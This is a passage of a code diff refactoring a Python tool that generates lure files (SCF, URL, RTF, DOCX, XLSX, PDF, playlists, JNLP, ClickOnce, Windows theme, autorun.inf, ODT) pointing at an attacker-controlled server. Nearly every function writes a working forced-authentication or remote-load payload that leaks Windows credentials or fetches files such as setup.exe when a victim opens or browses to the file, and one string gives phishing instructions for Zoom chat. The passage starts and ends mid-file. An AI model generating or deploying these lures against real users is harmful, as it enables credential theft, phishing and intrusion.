zPjxvZmZpY2U6Ym9keT48b2ZmaWNlOnRleHQ+PHRleHQ6c2VxdWVuY2UtZGVjbHM+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJJbGx1c3RyYXRpb24iLz48dGV4dDpzZXF1ZW5jZS1kZWNsIHRleHQ6ZGlzcGxheS1vdXRsaW5lLWxldmVsPSIwIiB0ZXh0Om5hbWU9IlRhYmxlIi8+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJUZXh0Ii8+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJEcmF3aW5nIi8+PC90ZXh0OnNlcXVlbmNlLWRlY2xzPjx0ZXh0OnAgdGV4dDpzdHlsZS1uYW1lPSJQMSI+PGRyYXc6ZnJhbWUgZHJhdzpzdHlsZS1uYW1lPSJmcjEiIGRyYXc6bmFtZT0iSW1hZ2UxIiB0ZXh0OmFuY2hvci10eXBlPSJhcy1jaGFyIiBzdmc6d2lkdGg9IjEwLjA0OWNtIiBzdmc6aGVpZ2h0PSI1LjYwM2NtIiBkcmF3OnpJbmRleD0iMCI+PGRyYXc6aW1hZ2UgeGxpbms6aHJlZj0iZmlsZTovLy8v"
     contentxml3 = "L3Rlc3QuanBnIiB4bGluazp0eXBlPSJzaW1wbGUiIHhsaW5rOnNob3c9ImVtYmVkIiB4bGluazphY3R1YXRlPSJvbkxvYWQiLz48ZHJhdzppbWFnZSB4bGluazpocmVmPSIuL09iamVjdFJlcGxhY2VtZW50cy9PYmplY3QgMSIgeGxpbms6dHlwZT0ic2ltcGxlIiB4bGluazpzaG93PSJlbWJlZCIgeGxpbms6YWN0dWF0ZT0ib25Mb2FkIi8+PC9kcmF3OmZyYW1lPjwvdGV4dDpwPjwvb2ZmaWNlOnRleHQ+PC9vZmZpY2U6Ym9keT48L29mZmljZTpkb2N1bWVudC1jb250ZW50Pg=="
 
-    # === DECODE PARTS AND INJECT IP ===
+    # Decode and inject server
     part1 = base64.b64decode(contentxml1).decode("utf-8")
     part2 = base64.b64decode(contentxml3).decode("utf-8")
-    fileout = part1 + server_ip + part2
+    fileout = part1 + server + part2
 
-    # === WRITE content.xml ===
-    with open("content.xml", "w", encoding="utf-8") as f:
-        f.write(fileout)
-
-    # === CREATE BLANK ODT USING ezodf ===
+    # Create ODT using ezodf
     try:
         from ezodf import newdoc
     except ImportError:
-        raise ImportError("Missing `ezodf`. Install with:\n  pip install ezodf && pip install --upgrade lxml")
+        print(
+            "Skipping ODT: Missing `ezodf`. Install with: pip install ezodf lxml",
+            file=sys.stderr,
+        )
+        return
 
-    temp_odt = "temp.odt"
-    odt = newdoc(doctype='odt', filename=temp_odt)
-    odt.save()
+    with tempfile.TemporaryDirectory() as tmpdir:
+        content_xml_path = os.path.join(tmpdir, "content.xml")
+        temp_odt = os.path.join(tmpdir, "temp.odt")
 
-    # === REBUILD ODT FILE WITH MALICIOUS content.xml ===
-    with zipfile.ZipFile(temp_odt, 'r') as zin, zipfile.ZipFile(output_filename, 'w') as zout:
-        for item in zin.infolist():
-            if item.filename != 'content.xml':
-                zout.writestr(item, zin.read(item.filename))
+        # Write content.xml
+        with open(content_xml_path, "w", encoding="utf-8") as f:
+            f.write(fileout)
 
-    with zipfile.ZipFile(output_filename, 'a') as zf:
-        zf.write("content.xml", arcname="content.xml")
+        # Create blank ODT
+        odt = newdoc(doctype="odt", filename=temp_odt)
+        odt.save()
 
-    # === CLEAN UP ===
-    os.remove("content.xml")
-    os.remove(temp_odt)
+        # Rebuild ODT with malicious content.xml
+        final_odt = os.path.join(tmpdir, "final.odt")
+        with zipfile.ZipFile(temp_odt, "r") as zin:
+            with zipfile.ZipFile(final_odt, "w") as zout:
+                for item in zin.infolist():
+                    if item.filename != "content.xml":
+                        zout.writestr(item, zin.read(item.filename))
 
-    log_created(output_filename, "Open in LibreOffice / OpenOffice")
+        with zipfile.ZipFile(final_odt, "a") as zf:
+            zf.write(content_xml_path, arcname="content.xml")
+
+        # Copy to final destination
+        shutil.copy2(final_odt, filename)
+
+    print(f"Created: {filename} (OPEN IN LIBREOFFICE/OPENOFFICE)")
 
 
-# NOT WORKING ON LATEST WINDOWS
-# .scf remote IconFile Attack
-# Filename: shareattack.scf, action=browse, attacks=explorer
-def create_scf(generate,server,filename):
-	if generate == "modern":
-		log_skip("Skipping SCF as it does not work on modern Windows")
-		return
-	file = open(filename,'w')
-	file.write('''[Shell]
+def create_scf(server: str, filename: str, modern: bool = False) -> None:
+    """Create SCF file with remote icon. Not working on modern Windows."""
+    if modern:
+        print("Skipping SCF as it does not work on modern Windows")
+        return
+
+    content = f"""[Shell]
 Command=2
-IconFile=\\\\''' + server + '''\\tools\\nc.ico
+IconFile=\\\\{server}\\tools\\nc.ico
 [Taskbar]
-Command=ToggleDesktop''')
-	file.close()
-	log_created(filename, "BROWSE TO FOLDER")
+Command=ToggleDesktop"""
 
-# .url remote url attack
-def create_url_url(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''[InternetShortcut]
-URL=file://''' + server + '''/leak/leak.html''')
-	file.close()
-	log_created(filename, "BROWSE TO FOLDER")
+    with open(filename, "w") as f:
+        f.write(content)
+    print(f"Created: {filename} (BROWSE TO FOLDER)")
 
 
-# .url remote IconFile attack
-# Filename: shareattack.url, action=browse, attacks=explorer
-def create_url_icon(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''[InternetShortcut]
+def create_url_url(server: str, filename: str, modern: bool = False) -> None:
+    """Create URL file with remote URL field."""
+    content = f"""[InternetShortcut]
+URL=file://{server}/leak/leak.html"""
+
+    with open(filename, "w") as f:
+        f.write(content)
+    print(f"Created: {filename} (BROWSE TO FOLDER)")
+
+
+def create_url_icon(server: str, filename: str, modern: bool = False) -> None:
+    """Create URL file with remote icon."""
+    content = f"""[InternetShortcut]
 URL=whatever
 WorkingDirectory=whatever
-IconFile=\\\\''' + server + '''\\%USERNAME%.icon
-IconIndex=1''')
-	file.close()
-	log_created(filename, "BROWSE TO FOLDER")
+IconFile=\\\\{server}\\%USERNAME%.icon
+IconIndex=1"""
 
-# .rtf remote INCLUDEPICTURE attack
-# Filename: shareattack.rtf, action=open, attacks=notepad/wordpad
-def create_rtf(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''{\\rtf1{\\field{\\*\\fldinst {INCLUDEPICTURE "file://''' + server + '''/test.jpg" \\\\* MERGEFORMAT\\\\d}}{\\fldrslt}}}''')
-	file.close()
-	log_created(filename, "OPEN")
+    with open(filename, "w") as f:
+        f.write(content)
+    print(f"Created: {filename} (BROWSE TO FOLDER)")
 
-# .xml remote stylesheet attack
-# Filename: shareattack.xml, action=open, attacks=word
-def create_xml(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+
+def create_rtf(server: str, filename: str, modern: bool = False) -> None:
+    """Create RTF file with INCLUDEPICTURE field."""
+    content = (
+        f'{{\\rtf1{{\\field{{\\*\\fldinst {{INCLUDEPICTURE "file://{server}/test.jpg"'
+        f" \\\\* MERGEFORMAT\\\\d}}}}{{\\fldrslt}}}}}}"
+    )
+
+    with open(filename, "w") as f:
+        f.write(content)
+    print(f"Created: {filename} (OPEN)")
+
+
+def create_xml(server: str, filename: str, modern: bool = False) -> None:
+    """Create XML file with remote stylesheet."""
+    content = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <?mso-application progid="Word.Document"?>
-<?xml-stylesheet type="text/xsl" href="\\\\''' + server + '''\\bad.xsl" ?>''')
-	file.close()
-	log_created(filename, "OPEN")
+<?xml-stylesheet type="text/xsl" href="\\\\{server}\\bad.xsl" ?>"""
 
-# .xml with remote includepicture field attack
-# Filename: shareattack.xml, action=open, attacks=word
-def create_xml_includepicture(generate,server, filename):
-	documentfilename = os.path.join(script_directory,"templates", "includepicture-template.xml") 
-	# Read the template file
-	file = open(documentfilename, 'r', encoding="utf8")
-	filedata = file.read()
-	file.close()
-	# Replace the target string
-	filedata = filedata.replace('127.0.0.1', server)
-	# Write the file out again
-	file = open(filename, 'w', encoding="utf8")
-	file.write(filedata)
-	file.close()
-	log_created(filename, "OPEN")
+    with open(filename, "w") as f:
+        f.write(content)
+    print(f"Created: {filename} (OPEN)")
 
-# .htm with remote image attack
-# Filename: shareattack.htm, action=open, attacks=internet explorer + Edge + Chrome when launched from desktop
-def create_htm(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''<!DOCTYPE html>
+
+def create_xml_includepicture(server: str, filename: str, modern: bool = False) -> None:
+    """Create XML file with remote includepicture field."""
+    template_path = os.path.join(
+        SCRIPT_DIRECTORY, "templates", "includepicture-template.xml"
+    )
+
+    with open(template_path, "r", encoding="utf-8") as f:
+        filedata = f.read()
+
+    filedata = filedata.replace("127.0.0.1", server)
+
+    with open(filename, "w", encoding="utf-8") as f:
+        f.write(filedata)
+    print(f"Created: {filename} (OPEN)")
+
+
+def create_htm(server: str, filename: str, modern: bool = False) -> None:
+    """Create HTML file with remote image."""
+    content = f"""<!DOCTYPE html>
 <html>
-   <img src="file://''' + server + '''/leak/leak.png"/>
-</html>''')
-	file.close()
-	log_created(filename, "OPEN FROM DESKTOP WITH CHROME, IE OR EDGE")
+   <img src="file://{server}/leak/leak.png"/>
+</html>"""
 
-# .htm with rlocal handler attack
-# Filename: shareattack-(handler).htm, action=open, attacks=open in web browser, will automatically open word
-def create_htm_handler(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''<!DOCTYPE html>
+    with open(filename, "w") as f:
+        f.write(content)
+    print(f"Created: {filename} (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)")
+
+
+def create_htm_handler(server: str, filename: str, modern: bool = False) -> None:
+    """Create HTML file with ms-word handler."""
+    content = f"""<!DOCTYPE html>
 <html>
-	<script>
-		location.href = 'ms-word:ofe|u|\\\\' + server + '\\leak\\leak.docx';
+    <script>
+        location.href = 'ms-word:ofe|u|\\\\{server}\\leak\\leak.docx';
+    </script>
+</html>"""
 
-	</script>
-</html>''')
-	file.close()
-	log_created(filename, "OPEN FROM DESKTOP WITH CHROME, IE OR EDGE")
+    with open(filename, "w") as f:
+        f.write(content)
+    print(f"Created: {filename} (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)")
 
-# .docx file with remote includepicture field attack
-def create_docx_includepicture(generate,server,filename):
-	# Source path  
-	src = os.path.join(script_directory,"templates", "docx-includepicture-template") 
-	# Destination path  
-	dest = os.path.join("docx-includepicture-template")
-	# Copy the content of  
-	# source to destination  
-	shutil.copytree(src, dest)  
-	documentfilename = os.path.join("docx-includepicture-template", "word", "_rels", "document.xml.rels")
-	# Read the template file
-	file = open(documentfilename, 'r')
-	filedata = file.read()
-	file.close()
-	# Replace the target string
-	filedata = filedata.replace('127.0.0.1', server)
-	# Write the file out again
-	file = open(documentfilename, 'w')
-	file.write(filedata)
-	file.close()
-	shutil.make_archive(filename, 'zip', "docx-includepicture-template")
-	os.rename(filename +".zip",filename)
-	shutil.rmtree("docx-includepicture-template")
-	log_created(filename, "OPEN")
 
-# .docx file with remote template attack
-# Filename: shareattack.docx (unzip and put inside word\_rels\settings.xml.rels), action=open, attacks=word
-# Instructions: Word > Create New Document > Choose a Template > Unzip docx, change target in word\_rels\settings.xml.rels change target to smb server
-def create_docx_remote_template(generate,server,filename):
-	# Source path  
-	src = os.path.join(script_directory,"templates", "docx-remotetemplate-template") 
-	# Destination path  
-	dest = os.path.join("docx-remotetemplate-template")
-	# Copy the content of  
-	# source to destination  
-	shutil.copytree(src, dest)  
-	documentfilename = os.path.join("docx-remotetemplate-template", "word", "_rels", "settings.xml.rels")
-	# Read the template file
-	file = open(documentfilename, 'r')
-	filedata = file.read()
-	file.close()
-	# Replace the target string
-	filedata = filedata.replace('127.0.0.1', server)
-	# Write the file out again
-	file = open(documentfilename, 'w')
-	file.write(filedata)
-	file.close()
-	shutil.make_archive(filename, 'zip', "docx-remotetemplate-template")
-	os.rename(filename +".zip",filename)
-	shutil.rmtree("docx-remotetemplate-template")
-	log_created(filename, "OPEN")
+def create_docx_includepicture(
+    server: str, filename: str, modern: bool = False
+) -> None:
+    """Create DOCX file with remote includepicture field."""
+    src = os.path.join(SCRIPT_DIRECTORY, "templates", "docx-includepicture-template")
 
-# .docx file with Frameset attack
-def create_docx_frameset(generate,server,filename):
-	# Source path  
-	src = os.path.join(script_directory,"templates", "docx-frameset-template") 
-	# Destination path  
-	dest = os.path.join("docx-frameset-template")
-	# Copy the content of  
-	# source to destination  
-	shutil.copytree(src, dest)  
-	documentfilename = os.path.join("docx-frameset-template", "word", "_rels", "webSettings.xml.rels")
-	# Read the template file
-	file = open(documentfilename, 'r')
-	filedata = file.read()
-	file.close()
-	# Replace the target string
-	filedata = filedata.replace('127.0.0.1', server)
-	# Write the file out again
-	file = open(documentfilename, 'w')
-	file.write(filedata)
-	file.close()
-	shutil.make_archive(filename, 'zip', "docx-frameset-template")
-	os.rename(filename +".zip",filename)
-	shutil.rmtree("docx-frameset-template")
-	log_created(filename, "OPEN")
+    with tempfile.TemporaryDirectory() as tmpdir:
+        dest = os.path.join(tmpdir, "docx-includepicture-template")
+        shutil.copytree(src, dest)
 
-# .xlsx file with cell based attack
-def create_xlsx_externalcell(generate,server,filename):
-	workbook = xlsxwriter.Workbook(filename)
-	worksheet = workbook.add_worksheet()
-	worksheet.write_url('AZ1', "external://"+server+"\\share\\[Workbookname.xlsx]SheetName'!$B$2:$C$62,2,FALSE)")
-	workbook.close()
-	log_created(filename, "OPEN")
+        rels_file = os.path.join(dest, "word", "_rels", "document.xml.rels")
+        with open(rels_file, encoding="utf-8") as f:
+            filedata = f.read()
 
-# .wax remote playlist attack
-# Filename: shareattack.wax, action=open, attacks=windows media player
-def create_wax(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''https://''' + server + '''/test
-file://\\\\''' + server + '''/steal/file''')
-	file.close()
-	log_created(filename, "OPEN")
+        filedata = filedata.replace("127.0.0.1", server)
 
-# .m3u remote playlist attack
-# Filename: shareattack.m3u, action=open, attacks=windows media player
-def create_m3u(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''#EXTM3U
+        with open(rels_file, "w", encoding="utf-8") as f:
+            f.write(filedata)
+
+        archive_base = os.path.join(tmpdir, "output")
+        shutil.make_archive(archive_base, "zip", dest)
+        shutil.move(archive_base + ".zip", filename)
+
+    print(f"Created: {filename} (OPEN)")
+
+
+def create_docx_remote_template(
+    server: str, filename: str, modern: bool = False
+) -> None:
+    """Create DOCX file with remote template."""
+    src = os.path.join(SCRIPT_DIRECTORY, "templates", "docx-remotetemplate-template")
+
+    with tempfile.TemporaryDirectory() as tmpdir:
+        dest = os.path.join(tmpdir, "docx-remotetemplate-template")
+        shutil.copytree(src, dest)
+
+        rels_file = os.path.join(dest, "word", "_rels", "settings.xml.rels")
+        with open(rels_file, encoding="utf-8") as f:
+            filedata = f.read()
+
+        filedata = filedata.replace("127.0.0.1", server)
+
+        with open(rels_file, "w", encoding="utf-8") as f:
+            f.write(filedata)
+
+        archive_base = os.path.join(tmpdir, "output")
+        shutil.make_archive(archive_base, "zip", dest)
+        shutil.move(archive_base + ".zip", filename)
+
+    print(f"Created: {filename} (OPEN)")
+
+
+def create_docx_frameset(server: str, filename: str, modern: bool = False) -> None:
+    """Create DOCX file with frameset attack."""
+    src = os.path.join(SCRIPT_DIRECTORY, "templates", "docx-frameset-template")
+
+    with tempfile.TemporaryDirectory() as tmpdir:
+        dest = os.path.join(tmpdir, "docx-frameset-template")
+        shutil.copytree(src, dest)
+
+        rels_file = os.path.join(dest, "word", "_rels", "webSettings.xml.rels")
+        with open(rels_file, encoding="utf-8") as f:
+            filedata = f.read()
+
+        filedata = filedata.replace("127.0.0.1", server)
+
+        with open(rels_file, "w", encoding="utf-8") as f:
+            f.write(filedata)
+
+        archive_base = os.path.join(tmpdir, "output")
+        shutil.make_archive(archive_base, "zip", dest)
+        shutil.move(archive_base + ".zip", filename)
+
+    print(f"Created: {filename} (OPEN)")
+
+
+def create_xlsx_externalcell(server: str, filename: str, modern: bool = False) -> None:
+    """Create XLSX file with external cell reference."""
+    workbook = xlsxwriter.Workbook(filename)
+    worksheet = workbook.add_worksheet()
+    worksheet.write_url(
+        "AZ1",
+        f"external://{server}\\share\\[Workbookname.xlsx]SheetName'!$B$2:$C$62,2,FALSE)",
+    )
+    workbook.close()
+    print(f"Created: {filename} (OPEN)")
+
+
+def create_wax(server: str, filename: str, modern: bool = False) -> None:
+    """Create WAX playlist file."""
+    content = f"""https://{server}/test
+file://\\\\{server}/steal/file"""
+
+    with open(filename, "w") as f:
+        f.write(content)
+    print(f"Created: {filename} (OPEN)")
+
+
+def create_m3u(server: str, filename: str, modern: bool = False) -> None:
+    """Create M3U playlist file."""
+    content = f"""#EXTM3U
 #EXTINF:1337, Leak
-\\\\''' + server + '''\\leak.mp3''')
-	file.close()
-	log_created(filename, "OPEN IN WINDOWS MEDIA PLAYER ONLY")
+\\\\{server}\\leak.mp3"""
 
-# .asx remote playlist attack
-# Filename: shareattack.asx, action=open, attacks=windows media player
-def create_asx(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''<asx version="3.0">
+    with open(filename, "w") as f:
+        f.write(content)
+    print(f"Created: {filename} (OPEN IN WINDOWS MEDIA PLAYER ONLY)")
+
+
+def create_asx(server: str, filename: str, modern: bool = False) -> None:
+    """Create ASX playlist file."""
+    content = f"""<asx version="3.0">
    <title>Leak</title>
    <entry>
       <title></title>
-      <ref href="file://''' + server + '''/leak/leak.wma"/>
+      <ref href="file://{server}/leak/leak.wma"/>
    </entry>
-</asx>''')
-	file.close()
-	log_created(filename, "OPEN")
+</asx>"""
 
-# .jnlp remote jar attack
-# Filename: shareattack.jnlp, action=open, attacks=java web start
-def create_jnlp(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''<?xml version="1.0" encoding="UTF-8"?>
+    with open(filename, "w") as f:
+        f.write(content)
+    print(f"Created: {filename} (OPEN)")
+
+
+def create_jnlp(server: str, filename: str, modern: bool = False) -> None:
+    """Create JNLP file with remote JAR."""
+    content = f"""<?xml version="1.0" encoding="UTF-8"?>
 <jnlp spec="1.0+" codebase="" href="">
    <resources>
-      <jar href="file://''' + server + '''/leak/leak.jar"/>
+      <jar href="file://{server}/leak/leak.jar"/>
    </resources>
    <application-desc/>
-</jnlp>''')
-	file.close()
-	log_created(filename, "OPEN")
+</jnlp>"""
 
-# .application remote dependency codebase attack
-# Filename: shareattack.application, action=open, attacks= .NET ClickOnce
-def create_application(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''<?xml version="1.0" encoding="utf-8"?>
+    with open(filename, "w") as f:
+        f.write(content)
+    print(f"Created: {filename} (OPEN)")
+
+
+def create_application(server: str, filename: str, modern: bool = False) -> None:
+    """Create .NET ClickOnce application manifest."""
+    content = f"""<?xml version="1.0" encoding="utf-8"?>
 <asmv1:assembly xsi:schemaLocation="urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd" manifestVersion="1.0" xmlns:dsig="http://www.w3.org/2000/09/xmldsig#" xmlns="urn:schemas-microsoft-com:asm.v2" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1" xmlns:asmv2="urn:schemas-microsoft-com:asm.v2" xmlns:xrml="urn:mpeg:mpeg21:2003:01-REL-R-NS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
-   <assemblyIdentity name="Leak.app" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" xmlns="urn:schemas-microsoft-com:asm.v1" />
-   <description asmv2:publisher="Leak" asmv2:product="Leak" asmv2:supportUrl="" xmlns="urn:schemas-microsoft-com:asm.v1" />
-   <deployment install="false" mapFileExtensions="true" trustURLParameters="true" />
-   <dependency>
-      <dependentAssembly dependencyType="install" codebase="file://''' + server + '''/leak/Leak.exe.manifest" size="32909">
-         <assemblyIdentity name="Leak.exe" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" type="win32" />
-         <hash>
-            <dsig:Transforms>
-               <dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" />
-            </dsig:Transforms>
-            <dsig:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1" />
-            <dsig:DigestValue>ESZ11736AFIJnp6lKpFYCgjw4dU=</dsig:DigestValue>
-         </hash>
-      </dependentAssembly>
-   </dependency>
-</asmv1:assembly>''')
-	file.close()
-	log_created(filename, "DOWNLOAD AND OPEN")
+   <assemblyIdentity name="Leak.app" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" xmlns="urn:schemas-microsoft-com:asm.v1" />
+   <description asmv2:publisher="Leak" asmv2:product="Leak" asmv2:supportUrl="" xmlns="urn:schemas-microsoft-com:asm.v1" />
+   <deployment install="false" mapFileExtensions="true" trustURLParameters="true" />
+   <dependency>
+      <dependentAssembly dependencyType="install" codebase="file://{server}/leak/Leak.exe.manifest" size="32909">
+         <assemblyIdentity name="Leak.exe" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" type="win32" />
+         <hash>
+            <dsig:Transforms>
+               <dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" />
+            </dsig:Transforms>
+            <dsig:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1" />
+            <dsig:DigestValue>ESZ11736AFIJnp6lKpFYCgjw4dU=</dsig:DigestValue>
+         </hash>
+      </dependentAssembly>
+   </dependency>
+</asmv1:assembly>"""
 
-# .pdf remote object? attack
-# Filename: shareattack.pdf, action=open, attacks=Adobe Reader (Others?)
-def create_pdf(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''%PDF-1.7
+    with open(filename, "w") as f:
+        f.write(content)
+    print(f"Created: {filename} (DOWNLOAD AND OPEN)")
+
+
+def create_pdf(server: str, filename: str, modern: bool = False) -> None:
+    """Create PDF file with remote GoToE action."""
+    content = f"""%PDF-1.7
 1 0 obj
 <</Type/Catalog/Pages 2 0 R>>
 endobj
@@ -524,22 +584,22 @@ startxref
 << /Type /Page
    /Contents 4 0 R
    /AA <<
-	   /O <<
-	      /F (\\\\\\\\''' + server + '''\\\\test)
-		  /D [ 0 /Fit]
-		  /S /GoToE
-		  >>
-	   >>
-	   /Parent 2 0 R
-	   /Resources <<
-			/Font <<
-				/F1 <<
-					/Type /Font
-					/Subtype /Type1
-					/BaseFont /Helvetica
-					>>
-				  >>
-				>>
+       /O <<
+          /F (\\\\\\\\{server}\\\\test)
+          /D [ 0 /Fit]
+          /S /GoToE
+          >>
+       >>
+       /Parent 2 0 R
+       /Resources <<
+            /Font <<
+                /F1 <<
+                    /Type /Font
+                    /Subtype /Type1
+                    /BaseFont /Helvetica
+                    >>
+                  >>
+                >>
 >>
 endobj
 4 0 obj<< /Length 100>>
@@ -554,76 +614,82 @@ endstream
 endobj
 trailer
 <<
-	/Root 1 0 R
+    /Root 1 0 R
 >>
-%%EOF''')
-	file.close()
-	log_created(filename, "OPEN AND ALLOW")
+%%EOF"""
+
+    with open(filename, "w") as f:
+        f.write(content)
+    print(f"Created: {filename} (OPEN AND ALLOW)")
 
 
-def create_zoom(generate,server,filename):
-	if generate == "modern":
-		log_skip("Skipping zoom as it does not work on the latest versions")
-		return
-	file = open(filename,'w')
-	file.write('''To attack zoom, just put the following link along with your phishing message in the chat window:
+def create_zoom(server: str, filename: str, modern: bool = False) -> None:
+    """Create Zoom chat attack instructions. Not working on latest versions."""
+    if modern:
+        print("Skipping Zoom as it does not work on the latest versions")
+        return
 
-\\\\''' + server + '''\\xyz
-''')
-	file.close()
-	log_created(filename, "PASTE TO CHAT")
+    content = f"""To attack zoom, just put the following link along with your phishing message in the chat window:
 
-def create_theme(generate,server,filename):
-	with open(filename, 'w') as file:
-		file.write('''[Theme]
+\\\\{server}\\xyz
+"""
+
+    with open(filename, "w") as f:
+        f.write(content)
+    print(f"Created: {filename} (PASTE TO CHAT)")
+
+
+def create_theme(server: str, filename: str, modern: bool = False) -> None:
+    """Create Windows Theme file with remote resources."""
+    content = f"""[Theme]
 ; Windows - IDS_THEME_DISPLAYNAME_AERO_LIGHT
-DisplayName=\\'''+ server +''' Theme
+DisplayName=\\{server} Theme
 SetLogonBackground=0
 ; Computer - SHIDI_SERVER
-[CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\DefaultIcon]
-DefaultValue=\\\\'''+server+'''\\setup.exe,-109
+[CLSID\\{{20D04FE0-3AEA-1069-A2D8-08002B30309D}}\\DefaultIcon]
+DefaultValue=\\\\{server}\\setup.exe,-109
 
 ; UsersFiles - SHIDI_USERFILES
-[CLSID\\{59031A47-3F72-44A7-89C5-5595FE6B30EE}\\DefaultIcon]
-DefaultValue=\\\\'''+server+'''\\setup.exe,-123
+[CLSID\\{{59031A47-3F72-44A7-89C5-5595FE6B30EE}}\\DefaultIcon]
+DefaultValue=\\\\{server}\\setup.exe,-123
 
 ; Network - SHIDI_MYNETWORK
-[CLSID\\{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}\\DefaultIcon]
-DefaultValue=\\\\'''+server+'''\\setup.exe,-25
+[CLSID\\{{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}}\\DefaultIcon]
+DefaultValue=\\\\{server}\\setup.exe,-25
 
 ; Recycle Bin - SHIDI_RECYCLERFULL SHIDI_RECYCLER
-[CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\DefaultIcon]
-Full=\\\\'''+server+'''\\setup.exe,-54
-Empty=\\\\'''+server+'''\\setup.exe,-55
+[CLSID\\{{645FF040-5081-101B-9F08-00AA002F954E}}\\DefaultIcon]
+Full=\\\\{server}\\setup.exe,-54
+Empty=\\\\{server}\\setup.exe,-55
 
 [Control Panel\\Cursors]
-AppStarting=\\\\'''+server+'''\\setup.exe
-Arrow=\\\\'''+server+'''\\aero_arrow.cur
+AppStarting=\\\\{server}\\setup.exe
+Arrow=\\\\{server}\\aero_arrow.cur
 Crosshair=
-Hand=\\\\'''+server+'''\\aero_link.cur
-Help=\\\\'''+server+'''\\aero_helpsel.cur
+Hand=\\\\{server}\\aero_link.cur
+Help=\\\\{server}\\aero_helpsel.cur
 IBeam=
-No=\\\\'''+server+'''\\aero_unavail.cur
-NWPen=\\\\'''+server+'''\\aero_pen.cur
-SizeAll=\\\\'''+server+'''\\aero_move.cur
-SizeNESW=\\\\'''+server+'''\\aero_nesw.cur
-SizeNS=\\\\'''+server+'''\\aero_ns.cur
-SizeNWSE=\\\\'''+server+'''\\aero_nwse.cur
-SizeWE=\\\\'''+server+'''\\aero_ew.cur
-UpArrow=\\\\'''+server+'''\\aero_up.cur
-Wait=\\\\'''+server+'''\\aero_busy.ani
+No=\\\\{server}\\aero_unavail.cur
+NWPen=\\\\{server}\\aero_pen.cur
+SizeAll=\\\\{server}\\aero_move.cur
+SizeNESW=\\\\{server}\\aero_nesw.cur
+SizeNS=\\\\{server}\\aero_ns.cur
+SizeNWSE=\\\\{server}\\aero_nwse.cur
+SizeWE=\\\\{server}\\aero_ew.cur
+UpArrow=\\\\{server}\\aero_up.cur
+Wait=\\\\{server}\\aero_busy.ani
 DefaultValue=Windows Default
 DefaultValue.MUI=@main.cpl,-1020
 
 [Control Panel\\Desktop]
-Wallpaper=\\\\'''+server+'''\\setup.exe
+Wallpaper=\\\\{server}\\setup.exe
 TileWallpaper=0
 WallpaperStyle=10
 Pattern=
 MultimonBackgrounds=0
 
 [VisualStyles]
-Path=\\\\'''+server+'''\\Themes\\Aero\\Aero.msstyles
+Path=\\\\{server}\\Themes\\Aero\\Aero.msstyles
 ColorStyle=NormalColor
 Size=NormalSize
 AutoColorization=0
@@ -639,50 +705,62 @@ MTSM=RJSPBS
 
 [Sounds]
 ; IDS_SCHEME_DEFAULT
-SchemeName=@\\\\'''+server+'''\\setup.dll,-800
-		''')
-	log_created(filename, "THEME TO INSTALL")
+SchemeName=@\\\\{server}\\setup.dll,-800
+        """
 
-def create_autoruninf(generate,server,filename):
-	if generate == "modern":
-		log_skip("Skipping Autorun.inf as it does not work on modern Windows")
-		return
-	file = open(filename,'w')
-	file.write('''[autorun]
-open=\\\\''' + server + '''\\setup.exe
+    with open(filename, "w") as f:
+        f.write(content)
+    print(f"Created: {filename} (INSTALL THEME)")
+
+
+def create_autoruninf(server: str, filename: str, modern: bool = False) -> None:
+    """Create Autorun.inf file. Not working on modern Windows."""
+    if modern:
+        print("Skipping Autorun.inf as it does not work on modern Windows")
+        return
+
+    content = f"""[autorun]
+open=\\\\{server}\\setup.exe
 icon=something.ico
-action=open Setup.exe''')
-	file.close()
-	log_created(filename, "BROWSE TO FOLDER")
+action=open Setup.exe"""
 
-def create_desktopini(generate,server,filename):
-	if generate == "modern":
-		log_skip("Skipping desktop.ini as it does not work on modern Windows")
-		return
-	file = open(filename,'w')
-	file.write('''[.ShellClassInfo]
-IconResource=\\\\''' + server + '''\\aa''')
-	file.close()
-	log_created(filename, "BROWSE TO FOLDER")
+    with open(filename, "w") as f:
+        f.write(content)
+    print(f"Created: {filename} (BROWSE TO FOLDER)")
 
-def create_libraryms(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''<?xml version="1.0" encoding="UTF-8"?>
+
+def create_desktopini(server: str, filename: str, modern: bool = False) -> None:
+    """Create desktop.ini file. Not working on modern Windows."""
+    if modern:
+        print("Skipping desktop.ini as it does not work on modern Windows")
+        return
+
+    content = f"""[.ShellClassInfo]
